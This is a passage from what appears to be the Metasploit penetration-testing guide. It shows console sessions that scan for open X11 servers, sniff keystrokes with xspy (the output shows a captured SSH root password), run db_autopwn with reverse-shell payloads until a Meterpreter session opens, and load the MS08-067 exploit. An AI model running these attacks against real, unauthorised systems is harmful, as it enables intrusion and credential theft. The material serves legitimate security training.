90pt;text-indent: 0pt;text-align: left;">in that it scours a range of hosts for X11 servers that allow users to connect without authentication. Although X11 servers aren’t widely used today, lots</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">of archaic boxes out there are still running old, unpatched, and forgotten operating systems. As you’ve seen in the preceding two examples, legacy sys- tems are often the most vulnerable systems on a network.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To run the <span class="s19">open_x11 </span>scanner, simply configure as you would most other auxiliary modules by setting the <span class="s25">RHOSTS </span>and, optionally, the <span class="s25">THREADS </span>values. A session is shown next. Notice at IP address 192.168.1.23 that the scanner has found an open X server. This is a serious vulnerability because it allows an attacker to gain unauthenticated access to the system: The X system handles the GUI including the mouse and keyboard.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_160.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/x11/open_x11</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(open_x11) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">6000</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:10pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">THREADS</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The number of concurrent threads</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(open_x11) &gt; <span class="s24">set RHOSTS 192.168.1.0/24</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.0/24</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(open_x11) &gt; <span class="s24">set THREADS 50</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">THREADS =&gt; 50</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(open_x11) &gt; <span class="s24">run</span></p><table style="border-collapse:collapse;margin-left:34pt" cellspacing="0"><tr style="height:10pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">192.168.1.1</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.0</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.2...</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.29</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.30</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Open X</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Server @ 192.168.1.23 (The XFree86 Project, Inc)</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.31</p></td></tr><tr style="height:16pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.32</p></td></tr><tr style="height:21pt"><td style="width:47pt"><p class="s43" style="padding-top: 4pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">. . . SNIP</p></td><td style="width:209pt"><p class="s43" style="padding-top: 4pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">. . .</p></td></tr><tr style="height:16pt"><td style="width:47pt"><p class="s28" style="padding-top: 4pt;padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-top: 4pt;padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.253</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.254</p></td></tr><tr style="height:10pt"><td style="width:47pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Trying</p></td><td style="width:209pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">192.168.1.255</p></td></tr></table><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_161.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To see what an attacker could do with a vulnerability like this, start key- stroke logging using Back|Track’s <span class="s19">xspy </span>tool, like so:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_162.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">cd /pentest/sniffers/xspy/</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/pentest/sniffers/xspy# <span class="s24">./xspy -display 192.168.1.23:0 -delay 100</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">ssh root@192.168.1.11(+BackSpace)37 sup3rs3cr3tp4s5w0rd</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">ifconfig exit</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_163.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The <span class="s19">xspy </span>tool remotely sniffs the X server’s keyboard session and has cap- tured a user running SSH to log in as root on a remote system. Vulnerabilities such as this can be rare, but when you find them they are extremely valuable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark140">Using Scan Results for Autopwning</a><a name="bookmark159">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Let’s take a quick diversion into exploitation. Metasploit’s Autopwn tool auto- matically targets and exploits a system using an open port or using the results of a vulnerability scan export. You can use Autopwn to harness the results of most vulnerability scanners, including NeXpose, Nessus, and OpenVAS.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For example, here’s how we could use a Nessus results import to target a system and autopwn it. Create a new database with <span class="s25">db_connect </span>and use <span class="s25">db_import </span>to import the scan report. In the next example, we run <span class="s25">db_autopwn </span>with a series of switches to launch attacks against all targets (<span class="s25">e</span>), show all matching modules (<span class="s25">t</span>), use a reverse shell payload (<span class="s25">r</span>), select exploit modules based on vulnerability (<span class="s25">x</span>), and also select based on open ports (<span class="s25">p</span>). Once <span class="s25">db_autopwn </span>launches, Metasploit begins launching exploits at the targets. Successful exploits return a shell to the attacking machine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_164.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_import /root/nessus.nbe</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_autopwn –e –t –r -x -p</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 53pt;text-indent: -29pt;line-height: 80%;text-align: left;"><span class="s30">O </span>[*] (<span class="s24">1/72 </span>[0 sessions]): Launching exploit/windows/mssql/ms09_004_sp_replwritetovarbin against 192.168.33.130:1433...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] (2/72 [0 sessions]): Launching exploit/windows/smb/psexec against 192.168.33.130:445... [*] (3/72 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.33.130:445...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Transmitting intermediate stager for over-sized stage...(216 bytes) [*] Sending stage (718336 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;"><span class="s30">8 </span>[*] Meterpreter session <span class="s24">1 opened </span>(192.168.1.101:40912 -&gt; 192.168.1.115:15991) [*] (72/72 [1 sessions]): Waiting on 2 launched modules to finish execution...</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] (72/72 [1 sessions]): Waiting on 0 launched modules to finish execution...</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_165.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">Based on these scans, Autopwn launched 72 exploits <span class="s32">O </span>and one was suc- cessful, as shown at <span class="s32">8</span>. This exploit allows us full access to the machine with a Meterpreter console that will be discussed in far more depth in Chapter 6.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s19" style="padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>One big caveat to remember when using Autopwn: If you’re going in with your Autopwn guns blazing, the target system can crash or lose stability. Autopwn has useful features not covered here, such as the ability to select only exploits that have an “Excellent” rank- ing, meaning it is very unlikely they will crash the remote system or service. For more information on its usage, enter <span class="s44">db_autopwn –h</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 233pt;text-indent: 0pt;text-align: left;"><span><img width="63" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_166.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 120pt;text-indent: 0pt;text-align: left;"><a name="bookmark160">THE JOY OF EXPLOITATION </a><a name="bookmark176">&zwnj;</a><a name="bookmark177">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Exploitation is the pinnacle of many security profes- sionals’ careers. The ability to gain full control over a targeted machine is a great feeling, if perhaps a little scary. But even though exploitation techniques have advanced quite a bit over the years, the adoption of various system and network protections has made it</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">increasingly more difficult to succeed with basic exploits. In this chapter, we move into more difficult attack methods, beginning with command-line</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">interfaces to the Metasploit Framework. Most of the attacks and customizations discussed in this chapter will occur in <span class="s19">msfconsole</span>, <span class="s19">msfencode</span>, and <span class="s19">msfpayload</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Before you begin to exploit systems, you need to understand a few things about penetration testing and exploitation. In Chapter 1 you were introduced to basic penetration testing methods. In Chapter 2 you learned the basics of the Framework and what to expect from each tool. In Chapter 3 we explored the intelligence gathering phase, and in Chapter 4 you learned about vulnerability scanning.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this chapter, we focus on the basics of exploitation. Our goal is to familiarize you with the different commands available through the Frame- work, which we’ll build upon in later chapters. Most of the attacks from this</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">point forward will occur through <span class="s19">msfconsole</span>, and you will need a solid under- standing of <span class="s19">msfconsole</span>, <span class="s19">msfpayload</span>, and <span class="s19">msfencode </span>to get the most out of the balance of this book.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark161">Basic Exploitation</a><a name="bookmark178">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Metasploit Framework contains hundreds of modules, and it’s nearly impossible to remember them all. Running <span class="s25">show </span>from <span class="s19">msfconsole </span>will display every module available in the Framework, but you can also narrow your search by displaying only specific types of modules as discussed in the following sections.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark162">msf&gt; show exploits</a><a name="bookmark179">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Within <span class="s19">msfconsole</span>, exploits operate against the vulnerabilities that you dis- cover during a penetration test. New exploits are always being developed, and the list will continue to grow. This command will display every currently available exploit within the Framework.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark163">msf&gt; show auxiliary</a><a name="bookmark180">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Auxiliary modules in Metasploit can be used for a wide range of purposes. They can operate as scanners, denial-of-service modules, fuzzers, and much more. This command will display them and list their features.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark164">msf&gt; show options</a><a name="bookmark181">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Options control various settings needed for proper functionality of the Framework modules. When you run <span class="s25">show options </span>while a module is selected, Metasploit will display only the options that apply to that particular module. Entering <span class="s25">msf&gt; show options </span>when not in a module will display the available global options—for example, you can set <span class="s25">LogLevel </span>to be more verbose as you perform an attack. You can also issue the <span class="s25">back </span>command to go back once inside a module.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_167.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">use windows/smb/ms08_067_netapi </span>msf exploit(ms08_067_netapi) &gt; <span class="s24">back </span>msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_168.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The <span class="s25">search </span>command is useful for finding a specific attack, auxiliary module, or payload. For example, if you want to launch an attack against SQL, you could search for SQL like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_169.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">search  mssql</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;mssql&#39;...</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Auxiliary</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7196pt" cellspacing="0"><tr style="height:10pt"><td style="width:107pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:78pt"><p class="s28" style="padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: right;">Disclosure Date</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:152pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:107pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:78pt"><p class="s28" style="padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: right;">---------------</p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:152pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:10pt"><td style="width:107pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">admin/mssql/mssql_enum</p></td><td style="width:78pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">normal</p></td><td style="width:152pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Microsoft SQL Server Configuration</p></td></tr></table><p class="s25" style="padding-left: 278pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enumerator</p><p class="s25" style="padding-left: 278pt;text-indent: -229pt;text-align: left;">admin/mssql/mssql_exec normal Microsoft SQL Server xp_cmdshell Command Execution</p><p class="s25" style="padding-left: 278pt;text-indent: -229pt;text-align: left;">admin/mssql/mssql_idf normal Microsoft SQL Server - Interesting Data Finder</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">admin/mssql/mssql_sql normal Microsoft SQL Server Generic Query</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/mssql/mssql_login normal MSSQL Login Utility</p><p class="s25" style="padding-left: 36pt;text-indent: 12pt;text-align: left;">scanner/mssql/mssql_ping normal MSSQL Ping Utility Exploits</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_170.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Or, to find the MS08-067 exploit specifically (an exploit related to the notorious Conficker worm that exploited a weakness within the Remote Procedure Call [RPC] service), you would enter this command:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_171.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">search ms08_067</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;ms08_067&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Exploits</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:127pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:28pt"><p class="s28" style="padding-left: 2pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Rank</p></td><td style="width:232pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:127pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:28pt"><p class="s28" style="padding-left: 2pt;padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: center;">----</p></td><td style="width:232pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-----------</p></td></tr><tr style="height:15pt"><td style="width:127pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s43" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">windows/smb/ms08_067_netapi</p></td><td style="width:28pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">great</p></td><td style="width:232pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft Server Service Relative Path Stack Corruption</p></td></tr></table><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 17pt;text-align: left;">Then, having found an exploit (<span class="s19">windows/smb/ms08_067_netapi</span>), you could load the found module with the <span class="s25">use </span>command, like so:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_172.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/smb/ms08_067_netapi</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_173.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice that when we issue the <span class="s25">use windows/smb/ms08_067_netapi </span>command, the <span class="s25">msf </span>prompt changes as follows:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_174.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_175.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This indicates that we have selected the <span class="s19">ms08_067_netapi </span>module and that commands issued at this prompt will be performed under that exploit.</p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>You can perform a <span class="s35">search </span>or <span class="s35">use </span>at any time within an exploit to switch to a different exploit or module.</p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now, with the prompt reflecting our chosen module, we can enter <span class="s25">show options </span>to display the options specific to the MS08-067 exploit:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_176.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:164pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr 